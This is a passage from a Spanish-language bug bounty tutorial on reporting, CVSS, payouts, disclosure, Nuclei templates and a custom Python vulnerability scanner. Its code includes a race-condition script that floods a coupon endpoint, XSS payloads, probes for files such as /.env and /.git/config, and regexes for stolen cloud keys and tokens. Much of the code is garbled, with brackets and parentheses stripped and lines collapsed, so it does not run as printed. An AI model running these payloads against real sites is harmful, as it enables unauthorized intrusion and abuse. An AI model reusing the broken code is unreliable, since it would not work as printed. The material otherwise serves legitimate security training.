La remediación recomendada es implementar autorización a nivel de endpoint:

1. Verificar que el user_id del token coincida con el recurso solicitado: # Incorrecto (vulnerable): def get_profile(user_id): return User.query.get(user_id) # Correcto: def get_profile(current_user, user_id): if current_user.id != user_id and not current_user.is_admin: return 403 Forbidden return User.query.get(user_id)

2. Implementar un middleware de autorización centralizado

3. Para endpoints de admin, verificar explícitamente el rol: @require_role('admin') def get_all_users: return User.query.all

4. Logging y monitoreo de accesos no autorizados
```

### 8.8 CVSS Score

El CVSS (Common Vulnerability Scoring System) es un estándar para medir la severidad de vulnerabilidades.

**Versiones de CVSS:**
- CVSS v3.1 es la más usada actualmente
- CVSS v4.0 está siendo adoptada gradualmente

**Métricas base de CVSS v3.1:**

```
AV (Attack Vector): N (Network) / A (Adjacent) / L (Local) / P (Physical)
AC (Attack Complexity): L (Low) / H (High)
PR (Privileges Required): N (None) / L (Low) / H (High)
UI (User Interaction): N (None) / R (Required)
S (Scope): U (Unchanged) / C (Changed)
C (Confidentiality): H (High) / L (Low) / N (None)
I (Integrity): H (High) / L (Low) / N (None)
A (Availability): H (High) / L (Low) / N (None)
```

**Calculadora CVSS:**
[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://www.first.org/cvss/calculator/3.1

**Ejemplos de puntuación:**

```
IDOR (acceso a datos de otros usuarios):
CVSS: 6.5 (Medium)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

XSS Reflected:
CVSS: 6.1 (Medium)
Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N

RCE (autenticado):
CVSS: 8.8 (High)
Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

RCE (sin autenticación):
CVSS: 9.8 (Critical)
Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
```

**Severidades y rangos:**

```
None: 0.0
Low: 0.1 - 3.9
Medium: 4.0 - 6.9
High: 7.0 - 8.9
Critical:  9.0 - 10.0
```

## 9. comunicación con Triage

La comunicación con el equipo de triage puede hacer la diferencia entre cobrar un bounty y que te rechacen el reporte.

### 9.1 Profesionalismo

Sé profesional SIEMPRE. Las empresas comparten información sobre hackers problemáticos.

**Reglas de oro:**

1. **No seas agresivo:** No amenaces ni exijas pagos
2. **Sé paciente:** El triage puede tardar días o semanas
3. **Sé claro:** No asumas que entienden tu technical jargon
4. **Sé honesto:** Si no sabés algo, decilo
5. **No compartas info:** No publiques el bug hasta que esté arreglado
6. **Respetá las políticas:** Cada programa tiene sus reglas
7. **No hagas presión:** Preguntar seguido no acelera las cosas

**Ejemplo de comunicación profesional:**

```
Buenas [equipo],

Adjunto el PoC completo de la vulnerabilidad encontrada.
Cualquier duda o si necesitan más información, estoy a disposición.

Saludos,
[Tu nombre]
```

### 9.2 Evidencia

Siempre proporcioná evidencia clara y completa.

**Qué incluir:**

1. **Screenshots:** Con anotaciones (flechas, círculos) explicando qué ver
2. **Videos:** Grabación de pantalla mostrando el [exploit](../raw/m3t4spl01t.md#exploits) completo
3. **Requests [http](../raw/r3d3s-f0nd4m3nt0s.md#http):** Completos (method, path, headers, body)
4. **Código:** Scripts PoC en [python](../raw/pyth0n-f0r-h4ck1ng.md), bash, etc.
5. **Timestamps:** Cuándo se descubrió, cuándo se probó

**Herramientas para evidencia:**

```bash
# Screenshot automático
# Usar Flameshot (Linux), Snip & Sketch (Win), CleanShot (Mac)
# O usar herramientas CLI

# Grabar requests con curl
curl -v -X GET "https://target.com/api/v1/users/102/profile" \ -H "Authorization: Bearer TOKEN" 2>&1 | tee request_response.txt

# Exportar de Burp
# Right-click -> Copy as curl command
# Right-click -> Save item
```

### 9.3 Response Times

Cada plataforma tiene SLAs (Service Level Agreements) para tiempos de respuesta.

**Tiempos típicos:**

```
HackerOne: - Primer response: 24-48h (programas gestionados) - Triage completo: 3-7 días - Pago: 30-45 días después de aceptado

Bugcrowd: - Primer response: 48-72h - Triage completo: 5-10 días - Pago: Mensual (o inmediato en algunos programas)

Synack: - Primer response: 12-24h - Triage completo: 2-5 días - Pago: Semanal (más rápido)
```

**Cuándo hacer follow-up:**

```
Día 1: Report enviado
Día 3: Si no hay respuesta, preguntar cortésmente
Día 7: Si no hay resolución, escalar cortésmente
Día 14: Si no hay respuesta, contactar soporte de la plataforma
Día 30: Si no hay resolución, escalar a mediación
```

### 9.4 Dispute Handling

A veces el triage rechaza tu reporte. No te desanimes; a veces es un error.

**Pasos para disputar un rechazo:**

1. **Leé la razón del rechazo cuidadosamente**
2. **Revisá si realmente es un duplicado** (a veces lo es)
3. **Revisá si tu reporte era claro** (quizás no entendieron)
4. **Respondé profesionalmente explicando por qué debería ser aceptado**
5. **Proporcioná evidencia adicional** si es necesario
6. **Si la plataforma tiene mediación, escalá** (solo si estás seguro)

**Ejemplo de disputa:**

```
Estimado equipo,

Gracias por la revisión rápida. Sin embargo, creo que este reporte
merece una segunda revisión por las siguientes razones:

1. El reporte citado como duplicado (#1234) describe un XSS en /profile.php?name=, mientras que mi reporte es sobre un SQLi en /api/v1/users/search?id= — son vectores completamente diferentes y en diferentes aplicaciones.

2. Adjunto evidencia adicional que demuestra el impacto completo, incluyendo la extracción de datos de la base de datos.

3. El PoC en video adjunto muestra claramente la explotación.

Quedo a disposición para cualquier consulta adicional.

Saludos,
[Tu nombre]
```

## 10. Monetización

### 10.1 Promedio de Bounties por Plataforma

Los bounties varían enormemente según la plataforma, el programa, y el tipo de vulnerabilidadc.

**Bounties promedio por severidad:**

```
Vulnerabilidad | Bounty Range (USD)
----------------------|-------------------
Critical RCE | $5,000 - $100,000+
Critical SQLi | $2,000 - $50,000
Critical SSRF | $3,000 - $25,000
High XSS (stored) | $500 - $5,000
High IDOR | $500 - $5,000
Medium XSS (reflected)| $250 - $2,000
Medium CSRF | $100 - $1,000
Low Info Disclosure | $50 - $500
```

**Bounties por plataforma:**

```
HackerOne: - Programs top: Google ($100k+), Microsoft ($50k+), PayPal ($25k+) - Average: $500 - $2,000 - Top hackers: $200k - $1M+/year

Bugcrowd: - Programs top: Apple ($100k+), Tesla ($15k+), Atlassian ($10k+) - Average: $300 - $1,500 - Top hackers: $100k - $500k/year

Synack: - Average: $1,000 - $5,000 - Top hackers: $100k - $300k/year - Hourly rate option: $50 - $150/hour

Intigriti: - Average: 200 - 1,500 - Top hackers: 50k - 200k/year
```

### 10.2 Tasas de Triage/Mediación

Las plataformas cobran fees al hacker sobre el bounty.

```
Plataforma | Fee al Hacker | Fee al Programa
-----------|---------------|----------------
HackerOne  | 20% | Variable (managed: ~20-30%)
Bugcrowd | 20% | Variable (managed: ~20-25%)
Intigriti  | 15% | Variable
YesWeHack  | 15-20% | Variable
Synack | 0% (pago fijo)| Subscription fee
```

**Ejemplo de fee:**

```
Bounty reportado: $1,000 USD
Fee HackerOne: 20% = $200
Recibís: $800 USD
```

### 10.3 Bounties por Severidad

Algunos programas publican sus tablas de bounties. otros no.

**Ejemplo de tabla de bounties:**

```
Severity  | Range (USD) | Ejemplos
----------|-------------------|-------------------------
Critical  | $10,000 - $100,000 | RCE, SQLi (full dump), SSRF a metadata
High | $2,500 - $10,000 | IDOR crítico, stored XSS en admin, LFI
Medium | $500 - $2,500 | Reflected XSS, CSRF, open redirect
Low | $100 - $500 | Information disclosure, minor misconfig
None | $0 (swag/HoF) | Missing headers, self-XSS
```

**Programas famosos con bounties altos:**

```
Google VRP: hasta $100,000+
Microsoft Bounty: hasta $250,000 (Hyper-V)
Apple Security: hasta $1,000,000 (Lock Mode bypass)
Meta/Facebook: hasta $40,000+
PayPal: hasta $25,000+
Shopify: hasta $100,000+
Tesla: hasta $15,000+
GitHub: hasta $30,000+
```

### 10.4 Repeatabilidad

La repeatabilidad significa poder encontrar bugs de forma consistente, no es solo suerte.

**Cómo ser consistente:**

1. **Sistema de notas:** Llevá registro de qué probaste y qué falta probar
2. **Checklists:** Usá listas de verificación para no saltearte nada
3. **Tooling:** Tené scripts y comandos listos para cada fase
4. **Schedule:** Dedicá tiempo fijo cada día
5. **Learning:** Estudiá nuevas técnicas regularmente
6. **Networking:** Seguí a otros hackers, leé writeups
7. **Especialización:** Elegí 2-3 tipos de bugs y convertite en experto

## 11. Detección de Duplicados

Los duplicados son el enemigo #1 del [bug bounty](../raw/b9g-b09nty.md) hunter. Pasás horas investigando, encontrás algo, lo reportás.. y te dicen "duplicate".

### 11.1 Técnicas de [recon](../raw/0s1nt.md#reconocimiento) para Bugs Únicos

Para minimizar duplicados, tenés que encontrar bugs que nadie más está viendo.

**Técnicas:**

1. **Recon profundo:** Encontrá subdominios que otros no encuentran
2. **Endpoints oscuros:** Probá endpoints que no están documentados
3. **Técnicas niche:** Usá técnicas que la mayoría no conoce
4. **Timing:** Reportá rápido (primeras horas del programa nuevo)
5. **Scope edges:** Probá los límites del scope (borderline)
6. **Business logic:** Bugs lógicos que scanners no detectan
7. **Chained attacks:** combiná 2+ bugs de bajo impacto para uno crítico
8. **Version-specific bugs:** Buscá cves en versiones específicas

### 11.2 Timing (First to Report)

El timing es clave. El primer reporte sobre una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) específica cobra.

**Estrategias de timing:**

1. **Programas nuevos:** Los primeros días hay menos competencia pero bugs fáciles
2. **Scope expandido:** Cuando agregan nuevos assets, hay bugs frescos
3. **Después de actualizaciones:** Nuevas versiones traen nuevos bugs
4. **Fines de semana:** Menos hackers activos
5. **Feriados:** Menos competencia

### 11.3 Niche Techniques

Las técnicas niche son las que te diferencian del resto.

**Técnicas niche para encontrar bugs únicos:**

1. **Race Conditions:** Probá condiciones de carrera en endpoints de transacciones, cupones, votos
2. **Prototype Pollution:** En aplicaciones JavaScript, probá prototype pollution
3. **[http](../raw/r3d3s-f0nd4m3nt0s.md#http) Request Smuggling:** Probá smuggling en frontends (CL.TE, TE.CL, TE.TE)
4. **[graphql](../raw/4p1-s3cur1ty.md#graphql) Batching Attacks:** Usá batching para bypass de [rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting)
5. **WebSocket Vulnerabilities:** Probá Cross-Site WebSocket Hijacking
6. **Serverless Attacks:** En [aws](../raw/cl0ud-h4ck1ng.md#aws) Lambda, event injection, [ssrf](../raw/w3b-h4ck1ng.md#ssrf) a metadata
7. **Cache Poisoning:** Probá web cache poisoning con headers no canónicos
8. **[oauth](../raw/hybr1d-1d3nt1ty.md#oauth) Misconfiguration:** Probá flujos [oauth](../raw/hybr1d-1d3nt1ty.md#oauth) con redirect_uri manipulation
9. **[jwt](../raw/4p1-s3cur1ty.md#jwt) Attacks:** Probá alg=none, key confusion, JWK injection, kid injection
10. **SSTI in unexpected places:** Probá SSTI en headers, file uploads, logs

**Ejemplo de técnica niche: Race Condition**

```python
import requests
import threading

def exploit_race_condition: url = "https://target.com/api/apply-coupon" data = {"coupon": "FREE100"} cookies = {"session": "abc123"} def send_request: r = requests.post(url, data=data, cookies=cookies) print(f"Status: {r.status_code}, Response: {r.text[:100]}") # 50 requests simultáneas threads = for i in range(50): t = threading.Thread(target=send_request) threads.append(t) t.start for t in threads: t.join

exploit_race_condition
```

## 12. comparativa de Plataformas

### 12.1 H1 vs [bugcrowd](../raw/b9g-b09nty.md#bugcrowd) vs Synack

| Aspecto | [hackerone](../raw/b9g-b09nty.md#hackerone) | Bugcrowd | Synack |
|------------------------|--------------------|--------------------|-------------------|
| Fundación | 2012 | 2011 | 2013 |
| # Hackers | ~600,000 | ~300,000 | ~30,000 (SRT) |
| # Programas | ~2,500 | ~1,500 | ~500 |
| Modelo | Crowdsourced | Crowdsourced | Invitation-only |
| Entrada | Abierta | Abierta | Examen |
| Fee hacker | 20% | 20% | 0% |
| Velocidad de pago | 30-45 días | Mensual | Semanal |
| Calidad de triage | Buena | Buena | Excelente |
| Comunidad | Excelente | Buena | Exclusiva |

### 12.2 Fees

Los fees son importantes para calcular cuánto vas a recibir realmente.

**Comparativa de fees:**

```
HackerOne: - 20% del bounty para el hacker - Ejemplo: $1,000 -> Recibís $800

Bugcrowd: - 20% del bounty para el hacker - Similar a H1

Intigriti: - 15% del bounty (menor que H1 y BC) - Más favorable para el hacker

YesWeHack: - 15-20% dependiendo del programa

Synack: - No cobra fee al hacker - Pagos fijos según tabla de Synack
```

### 12.3 Payout Speed

La velocidad de pago importa para el cash flow.

```
HackerOne: - Procesamiento: 24-48h después de aceptación - Transferencia: 3-5 días hábiles (ACH), 5-7 (PayPal)

Bugcrowd: - Pago mensual (agrupan todos los bounties del mes) - Transferencia: 5-7 días después del cierre mensual

Synack: - Pagos semanales (los viernes) - Transferencia: 3-5 días - Más rápido de todos

Intigriti: - Pago después de la aceptación del programa - 3-7 días después de aceptado
```

### 12.4 Program Quality

La calidad de los programas varía según la plataforma.

**HackerOne:**
- Programas muy variados (desde startups hasta Fortune 500)
- Muchos VDPs sin pago
- Programas gestionados con buena calidad
- Hacktivity pública

**Bugcrowd:**
- Programas curados por Bugcrowd
- Menos VDPs (mayoría con pago)
- VRT (Vulnerability Rating Taxonomy) pública

**Synack:**
- Solo programas enterprise con seguridad madura
- Target quality: excelente
- Menos programas pero más pago por bug

### 12.5 Triage Quality

La calidad del triage determina si te pagan o no.

**HackerOne:**
- Triage centralizado para programas gestionados
- Generalmente bueno pero [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables)

**Bugcrowd:**
- Triage centralizado siempre
- Consistente
- VRT guía la clasificación

**Synack:**
- Triage de Synack (equipo interno)
- Excelente calidad
- Feedback detallado

## 13. Disclosure

### 13.1 cvec Assignment

[cve](../raw/s3c-f0nd4m3nt0s.md#cve) (common Vulnerabilities and Exposures) es un identificador único para vulnerabilidades.

**Cómo obtener un CVE:**

1. Reportar una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) a un proveedor/vendor
2. El vendor acepta la vulnerabilidad
3. El vendor o vos solicitan un CVE a una CNA (CVE Numbering Authority)
4. La CNA asigna un identificador CVE
5. El CVE se publica cuando el vendor lanza el parche

**CNAs comunes para [bug bounty](../raw/b9g-b09nty.md):**

```
- HackerOne CNA (hackerone.com/cve)
- GitHub CNA (github.com/advisories)
- MITRE (cve.mitre.org)
- Cada vendor grande tiene su propia CNA (Microsoft, Google, Apple)
```

### 13.2 Coordinated Disclosure

Coordinated disclosure (antes llamado "responsible disclosure") es el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de trabajar con el vendor para parchear la vulnerabilidad antes de hacerla pública.

**Timeline típico:**

```
Día 0:  Descubrimiento de la vulnerabilidad
Día 1:  Reporte al vendor (con PoC completo)
Día 7:  Vendor confirma el reporte
Día 30: Vendor desarrolla el parche
Día 45: Vendor lanza el parche
Día 46: Publicación del advisory (CVE + writeup)
```

**Plazos comunes:**

```
- 90 días: Plazo estándar para coordinated disclosure (Google Project Zero)
- 45 días: Algunos programas más rápidos
- 120 días: Para vulnerabilidades complejas
```

### 13.3 Publication Timing

Cuándo publicar el writeup de tu vulnerabilidad.

**Factores a considerar:**

1. ¿El programa ya parcheó? -> Esperá confirmación
2. ¿El bounty ya se pagó? -> Generalmente podés publicar después
3. ¿Hay acuerdo de confidencialidad? -> Respetalo
4. ¿El CVE está publicado? -> Generalmente después del CVE

### 13.4 Credit

El crédito es importante para construir tu reputación.

**Cómo te dan crédito:**

1. **Hall of Fame:** [reconocimiento](../raw/0s1nt.md#reconocimiento)]( en la web del programa
2. **Platform Leaderboard:** Rankings de la plataforma
3. **Advisory:** Tu nombre en el advisory de seguridad
4. **CVE:** Como descubridor
5. **Social media:** El programa puede hacer shoutout
6. **Swag:** Remeras, stickers, hardware

## 14. Herramientas y comparativas

### 14.1 Burp Pro vs ZAP vs Custom

**[burp suite](../raw/w3b-h4ck1ng.md#burp-suite) Professional:**

- Precio: $449/año
- Ventajas: - Intruder (muy potente para [fuzzing](../raw/fuzz1ng.md)) - Repeater (repetir requests fácil) - Scanner (bueno pero no cubre todo) - Extensions (BApp store con cientos de extensions) - Project files (guardar todo) - Colaborator (detección OOB) - Sequencer (análisis de tokens) - Decoder (encoding/decoding)
- Desventajas: - Caro - No open source - Recursos intensivo

**[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) ZAP:**

- Precio: Gratuito
- Ventajas: - Open source - Actively maintained - Automation framework - API testing - WebSocket support - HUD (Heads Up Display) para testing - Buena integración [ci/cd](../raw/c1cd-h4ck1ng.md)
- Desventajas: - Menos pulido que Burp - Menos extensions - UI más lenta

**Custom Scanner:**

- Ventajas: - Total control - Puede encontrar bugs específicos - Sin límite de velocidad - Sin signature pública
- Desventajas: - Tiempo de desarrollo - Mantenimiento - Puede tener falsos positivos

### 14.2 Nuclei Templates Writing

Nuclei usa templates YAML para definir checks de [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades).

**Estructura de un template:**

```yaml
id: template-id

info: name: Template Name author: your-name severity: info | low | medium | high | critical description: "Description of the vulnerability" reference: - https://example.com/reference tags: tag1,tag2

requests: - method: GET path: - "{{BaseURL}}/vulnerable-endpoint" headers: User-Agent: Mozilla/5.0 matchers-condition: and matchers: - type: word words: - "vulnerable" part: body condition: any - type: status status: - 200
```

**Matchers:**

```yaml
# Word matcher
matchers: - type: word words: - "admin" - "password" part: body

# Regex matcher
matchers: - type: regex regex: - "([a-zA-Z0-9]{32})" part: body

# Status matcher
matchers: - type: status status: - 200 - 302

# Size matcher
matchers: - type: size size: - 100-200

# DSL matcher (expresiones)
matchers: - type: dsl dsl: - "len(body) > 1000 && contains(body, 'admin')" - "status_code == 200 && contains_all(body, 'error', 'exception')"
```

**Template completo de ejemplo:**

```yaml
id: custom-panel-detect

info: name: Admin Panel Detector author: tu-nombre severity: medium description: "Detects exposed admin panels and login pages" reference: - https://github.com/obheda12/GitDorker tags: admin,panel,exposure

requests: - method: GET path: - "{{BaseURL}}/admin" - "{{BaseURL}}/administrator" - "{{BaseURL}}/login" - "{{BaseURL}}/wp-admin" - "{{BaseURL}}/panel" - "{{BaseURL}}/manage" - "{{BaseURL}}/cpanel" - "{{BaseURL}}/dashboard" - "{{BaseURL}}/backend" - "{{BaseURL}}/portal" matchers-condition: or matchers: - type: word words: - "username" - "password" - "login" - "sign in" - "admin panel" part: body - type: status status: - 200 - 302 extractors: - type: kval kval: - "location" part: header
```

### 14.3 Custom Scanner Development

Desarrollar un scanner custom te permite automatizar tu metodología.

**Arquitectura de un scanner custom:**

```
Input: Lista de URLs/dominios | v
[Discovery Module] -> Encuentra subdominios, endpoints | v
[Probe Module] -> Verifica alive, tecnologías | v
[Scan Module] -> Ejecuta checks específicos | v
[Analysis Module] -> Filtra falsos positivos, prioriza | v
[Report Module] -> Genera output formateado
```

**Ejemplo de scanner modular ([python](../raw/pyth0n-f0r-h4ck1ng.md)):**

```python
#!/usr/bin/env python3
"""
Custom Bug Bounty Scanner
Scans targets for common vulnerabilities using multiple modules
"""

import argparse
import json
import logging
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Dict, Optional

import requests
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(level=logging.INFO, format='"'"'%(asctime)s - %(levelname)s - %(message)s'"'"')
logger = logging.getLogger(__name__) class Target: """Represents a target to scan""" def __init__(self, url: str): self.url = url self.parsed = urlparse(url) self.domain = self.parsed.netloc self.scheme = self.parsed.scheme self.base = f"{self.scheme}://{self.domain}" self.endpoints = self.technologies = self.findings = class BaseModule: """Base class for all scanner modules""" def __init__(self, name: str): self.name = name self.findings = def run(self, target: Target) -> List[Dict]: """Execute the module on a target""" raise NotImplementedError class XSSModule(BaseModule): """Detect reflected XSS vulnerabilities""" def __init__(self): super.__init__("xss_detector") self.payloads = [ "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "';alert(1);//", "\"><script>alert(1)</script>", "<svg onload=alert(1)>", "<body onload=alert(1)>", ] self.session = requests.Session self.session.headers.update({ "User-Agent": "CustomScanner/1.0" }) def run(self, target: Target) -> List[Dict]: findings = for endpoint in target.endpoints: for param, value in endpoint.get('params', {}).items: for payload in self.payloads: try: test_url = endpoint['url'].replace(value, payload, 1) r = self.session.get(test_url, timeout=10) if payload in r.text: finding = { "type": "Reflected XSS", "url": test_url, "param": param, "payload": payload, "severity": "high", "timestamp": datetime.now.isoformat } findings.append(finding) logger.warning(f"[XSS] Found in {test_url}") break except Exception as e: logger.debug(f"Error testing {endpoint['url']}: {e}") return findings class DirectoryModule(BaseModule): """Check for exposed directories and files""" def __init__(self): super.__init__("directory_scanner") self.paths = [ "/.git/config", "/.env", "/admin", "/backup", "/wp-admin", "/phpinfo.php", "/robots.txt", "/sitemap.xml", "/crossdomain.xml", "/server-status", "/debug", "/api", "/swagger.json", "/.well-known/", "/.htaccess", "/config", "/.DS_Store" ] def run(self, target: Target) -> List[Dict]: findings = session = requests.Session session.headers.update({"User-Agent": "CustomScanner/1.0"}) for path in self.paths: try: url = f"{target.base}{path}" r = session.get(url, timeout=10) if r.status_code == 200 and len(r.text) > 0: if not self._is_default_page(r): finding = { "type": "Exposed Path", "url": url, "status": r.status_code, "size": len(r.text), "severity": "medium", "timestamp": datetime.now.isoformat } findings.append(finding) logger.info(f"[DIR] Found: {url} ({r.status_code})") except Exception as e: logger.debug(f"Error checking {path}: {e}") return findings def _is_default_page(self, response) -> bool: default_signatures = [ "Index of /", "Welcome to nginx", "Apache HTTP Server", "It works", "Under Construction" ] for sig in default_signatures: if sig in response.text: return True return False class SecretModule(BaseModule): """Search for secrets in responses""" def __init__(self): super.__init__("secret_scanner") self.patterns = { "AWS Key": r"AKIA[0-9A-Z]{16}", "GitHub Token": r"ghp_[a-zA-Z0-9]{36}", "Google API Key": r"AIza[0-9A-Za-z\-_]{35}", "Slack Token": r"xox[baprs]-[0-9a-zA-Z\-]{10,}", "Private Key": r"-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----", "JWT Token": r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", } def run(self, target: Target) -> List[Dict]: findings = session = requests.Session import re for endpoint in target.endpoints: try: r = session.get(endpoint['url'], timeout=10) text = r.text for secret_type, pattern in self.patterns.items: matches = re.findall(pattern, text) for match in matches[:3]: masked = match[:8] + ".." + match[-4:] if len(match) > 12 else match finding = { "type": f"Secret: {secret_type}", "url": endpoint['url'], "match": masked, "severity": "critical", "timestamp": datetime.now.isoformat } findings.append(finding) logger.critical(f"[SECRET] Found {secret_type} in {endpoint['url']}") except Exception as e: logger.debug(f"Error scanning {endpoint['url']}: {e}") return findings class Scanner: """Main scanner orchestrator""" def __init__(self, targets: List[str], modules: List[BaseModule], threads: int = 10, output: str = "results.json"): self.targets = [Target(t) for t in targets] self.modules = modules self.threads = threads self.output = output self.all_findings = def prepare_targets(self): """Discover endpoints for each target""" logger.info("Preparing targets..") for target in self.targets: target.endpoints.append({ 'url': target.url, 'params': {} }) if target.url != target.base: target.endpoints.append({ 'url': target.base, 'params': {} }) def scan_target(self, target: Target) -> List[Dict]: """Run all modules on a single target""" target_findings = logger.info(f"Scanning {target.url}..") for module in self.modules: try: findings = module.run(target) target_findings.extend(findings) target.findings.extend(findings) except Exception as e: logger.error(f"Module {module.name} failed on {target.url}: {e}") return target_findings def run(self): """Execute the full scan""" logger.info(f"Starting scan with {len(self.targets)} targets and {len(self.modules)} modules") self.prepare_targets with ThreadPoolExecutor(max_workers=self.threads) as executor: futures = {executor.submit(self.scan_target, t): t for t in self.targets} for future in as_completed(futures): findings = future.result self.all_findings.extend(findings) self.generate_report def generate_report(self): """Generate a JSON report""" report = { "scan_time": datetime.now.isoformat, "total_targets": len(self.targets), "total_findings": len(self.all_findings), "findings_by_severity": { "critical": len([f for f in self.all_findings if f.get('severity') == 'critical']), "high": len([f for f in self.all_findings if f.get('severity') == 'high']), "medium": len([f for f in self.all_findings if f.get('severity') == 'medium']), "low": len([f for f in self.all_findings if f.get('severity') == 'low']), }, "findings": self.all_findings } with open(self.output, 'w') as f: json.dump(report, f, indent=2) logger.info(f"Report saved to {self.output}") print(f"\n{'='*50}") print(f"FINDINGS SUMMARY") print(f"{'='*50}") print(f"Total targets:  {len(self.targets)}") print(f"Total findings: {len(self.all_findings)}") for sev, count in report['findings_by_severity'].items: print(f"  {sev.capitalize}: {count}") print(f"{'='*50}") def main: parser = argparse.ArgumentParser(description="Custom Bug Bounty Scanner") parser.add_argument("-t", "--targets", nargs="+", required=True, help="Target URLs to scan") parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)") parser.add_argument("-o", "--output", default="results.json", help="Output file (default: results.json)") parser.add_argument("--modules", nargs="+", choices=["xss", "directory", "secret", "all"], default=["all"], help="Modules to run (default: all)") args = parser.parse_args # Initialize modules modules = if "all" in args.modules or "xss" in args.modules: modules.append(XSSModule) if "all" in args.modules or "directory" in args.modules: modules.append(DirectoryModule) if "all" in args.modules or "secret" in args.modules: modules.append(SecretModule) # Run scanner scanner = Scanner(args.targets, modules, args.threads, args.output) scanner.run if __name__ == "__main__": main
```

**Cómo usar este scanner:**

```bash
# Escanear un target
python3 custom_scanner.py -t https://target.com

# Escanear múltiples targets
python3 custom_scanner.py -t https://target1.com https://target2.com

# Escanear con solo módulo XSS
python3 custom_scanner.py -t https://target.com --modules xss

# Más threads (más rápido pero más agresivo)
python3 custom_scanner.py -t https://target.com --threads 50
```

## 15. Mindset del [bug bounty](../raw/b9g-b09nty.md) Hunter

### 15.1 [persistencia](./raw/w1nd0wsia)

El bug bounty es un juego de números y [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia).

**Realidades del bug bounty:**

- 90% de tu tiempo: no encontrás nada interesante
- 9%: encontrás algo low/medium
- 1%: encontrás algo critical/high

**Esto significa que:**

- NO te desanimes si no encontrás nada en semanas
- SEGUÍ probando, eventualmente algo aparece
- CADA request que hacés te da más información
- APRENDÉ de los fracasos (revisá por qué no encontraste)

### 15.2 Metodología

Una metodología sólida es lo que te separa de un principiante.

**Mi metodología personal:**

```
FASE 1: RECON (40% del tiempo) - Subdomain enumeration - Technology identification - Endpoint discovery - Parameter analysis

FASE 2: AUTOMATION (20% del tiempo) - Nuclei scanning - XSS scanning (dalfox) - Directory enumeration - Secret scanning

FASE 3: MANUAL (30% del tiempo) - Business logic testing - IDOR testing - Authentication bypass - Authorization testing

FASE 4: REPORT (10% del tiempo) - Write clear reports - Prepare PoCs - Submit and track
```

### 15.3 Documentación

La documentación es clave para no perder el tiempo.

**Qué documentar:**

1. **Targets activos:** Qué programas estás atacando
2. **Progress:** Qué ya probaste en cada target
3. **Findings:** vulnerabilidades encontradas, aunque sean low
4. **Notes:** Técnicas que funcionaron y que no
5. **Scripts:** comandos y scripts que usaste
6. **Results:** Output de todas las herramientas

**Sistema de documentación personal:**

```bash
# Crear estructura para cada target
mkdir -p targets/ejemplo.com/{recon,scanning,manual,report}

# Recon
targets/ejemplo.com/recon/ subdomains.txt alive_subs.txt tech_stack.txt

# Scanning
targets/ejemplo.com/scanning/ nuclei_results.txt dalfox_results.txt directory_scan.txt

# Manual testing
targets/ejemplo.com/manual/ notes.md endpoints_tested.txt payloads_tried.txt

# Report
targets/ejemplo.com/report/ finding_1.md finding_2.md
```

### 15.4 Time Management

El time management determina cuánto ganás.

**Estrategias de time management:**

1. **Pomodoro:** 25 min de trabajo, 5 min de break
2. **Batching:** Hacé tareas similares juntas
3. **Priority matrix:** Urgente/Importante
4. **Time blocking:** Asigná bloques fijos a cada actividad
5. **No multitasking:** Una cosa a la vez

**Ejemplo de schedule semanal:**

```
LUNES: - Mañana: Recon (nuevos targets) - Tarde: Manual testing (targets activos)

MARTES: - Mañana: Scanning automation - Tarde: Analysis de resultados

MIÉRCOLES: - Mañana: Manual testing - Tarde: Writing reports

JUEVES: - Mañana: Investigación (nuevas técnicas) - Tarde: Learning (writeups, cursos)

VIERNES: - Mañana: Manual testing / follow-ups - Tarde: Organización y documentación

SÁBADO: - CTFs, challenges, comunidad

DOMINGO: - OFF (descansá, quemarse no sirve)
```

## 16. Ejercicios Prácticos

### Ejercicio 1: setup de Entorno de [bug bounty](../raw/b9g-b09nty.md)

**Objetivo:** Configurar tu entorno de bug bounty completo.

```
1. Instalar Go (mínimo 1.21+)
2. Instalar herramientas: - subfinder - httpx - nuclei - katana - gau - waybackurls
3. Configurar APIs en subfinder
4. Instalar Burp Suite Community o ZAP
5. Configurar Firefox con FoxyProxy para Burp/ZAP
6. Descargar SecLists
7. Crear estructura de directorios para targets

Comandos: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest go install github.com/projectdiscovery/katana/cmd/katana@latest go install github.com/lc/gau/v2/cmd/gau@latest go install github.com/tomnomnom/waybackurls@latest go install github.com/hahwul/dalfox/v2@latest git clone https://github.com/danielmiessler/SecLists.git
```

### Ejercicio 2: [recon](../raw/0s1nt.md#reconocimiento) Completo de un Target

**Objetivo:** Ejecutar recon completo en un programa público.

```
Target: hackerone.com/security (programas públicos)
Elegí UN programa público de HackerOne.

Pasos:
1. Obtener subdominios con subfinder + amass + crt.sh
2. Resolver subdominios vivos con httpx
3. Detectar tecnologías con httpx -tech-detect
4. Crawlear con katana
5. Obtener URLs históricas con gau + waybackurls
6. Escanear con nuclei (templates generales)
7. Identificar 3 endpoints interesantes para manual testing

Entregable: - Archivo con todos los subdominios encontrados - Archivo con las tecnologías detectadas - Lista de 5 endpoints potencialmente vulnerables - Output de nuclei

